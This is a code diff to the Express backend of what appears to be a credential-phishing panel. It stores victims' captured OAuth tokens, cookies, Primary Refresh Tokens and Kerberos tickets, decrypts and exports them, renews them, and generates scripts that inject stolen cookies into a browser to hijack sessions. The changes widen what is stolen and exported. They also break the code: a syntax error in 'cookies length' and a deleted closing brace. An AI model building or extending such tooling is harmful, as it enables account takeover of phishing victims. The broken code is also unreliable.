@@ -9,7 +9,7 @@ const config = require('../config/env');
 router.get('/', userAuth, async (req, res) => {
   try {
     const { sort, search, page = 1, limit = 50 } = req.query;
-    let query = 'SELECT id, user_id, link_id, email, token_type, ip_address, user_agent, notes, expiration, last_renewed, renewal_count, stale, deleted, created_at FROM captured_tokens WHERE user_id = ? AND deleted = 0';
+    let query = 'SELECT id, user_id, link_id, email, token_type, ip_address, user_agent, notes, expiration, last_renewed, renewal_count, renewal_attempts, stale, deleted, created_at, tenant, template_type, account_type FROM captured_tokens WHERE user_id = ? AND deleted = 0';
     const params = [req.user.id];
 
     if (search) {
@@ -69,11 +69,22 @@ router.get('/:id', userAuth, async (req, res) => {
       expiration: token.expiration,
       last_renewed: token.last_renewed,
       renewal_count: token.renewal_count,
+      renewal_attempts: token.renewal_attempts,
+      account_type: token.account_type || 'unknown',
+      tenant: token.tenant,
+      template_type: token.template_type,
       created_at: token.created_at,
       access_token: decrypt(token.access_token_encrypted),
       refresh_token: decrypt(token.refresh_token_encrypted),
       id_token: decrypt(token.id_token_encrypted),
-      cookies: decrypt(token.cookies_encrypted)
+      cookies: decrypt(token.cookies_encrypted),
+      prt: decrypt(token.prt),
+      session_key_jwe: decrypt(token.session_key_jwe),
+      device_tenant_id: token.device_tenant_id,
+      tgt_ad: decrypt(token.tgt_ad),
+      tgt_cloud: decrypt(token.tgt_cloud),
+      kerberos_top_level_names: token.kerberos_top_level_names,
+      tgt_cloud_sessionkey: decrypt(token.tgt_cloud_sessionkey)
     };
 
     res.json(decrypted);
@@ -212,7 +223,7 @@ function generatePopupScript(cookies) {
   script += '     + "; Secure";\n';
   script += ' }\n';
   script += '\n';
-  script += ' console.log("[VGenius] Injected " + cookies.length + " cookies");\n';
+  script += ' console.log("[VGenius] Injected " + cookies length + " cookies");\n';
   script += '\n';
   script += ' // Redirect to trigger authentication\n';
   script += ' setTimeout(function() {\n';
@@ -260,7 +271,6 @@ function generateStandaloneHtml(cookies) {
   html += ' function setStatus(msg, type) {\n';
   html += ' statusDiv.className = "status " + type;\n';
   html += ' statusDiv.innerHTML = msg;\n';
-  html += ' }\n';
   html += '\n';
   html += ' function injectCookies() {\n';
   html += ' setStatus("Opening popup...", "success");\n';
@@ -449,7 +459,7 @@ router.post('/:id/renew', userAuth, async (req, res) => {
         // Use stored client_id if available, otherwise fall back to env
         const tokenClientId = token.client_id || config.AZURE_CLIENT_ID;
         const result = await cookieConverter.convertTokensToCookies(
-          refreshToken, templateType, tokenTenant, null, tokenClientId
+          refreshToken, templateType, tokenTenant, null, tokenClientId, token.account_type
         );
 
         if (result.success && result.cookies) {
@@ -669,7 +679,10 @@ router.post('/export', userAuth, async (req, res) => {
       access_token: decrypt(token.access_token_encrypted),
       refresh_token: decrypt(token.refresh_token_encrypted),
       id_token: decrypt(token.id_token_encrypted),
-      cookies: decrypt(token.cookies_encrypted)
+      cookies: decrypt(token.cookies_encrypted),
+      prt: decrypt(token.prt),
+      session_key_jwe: decrypt(token.session_key_jwe),
+      account_type: token.account_type || 'unknown'
     }));
 
     res.json({
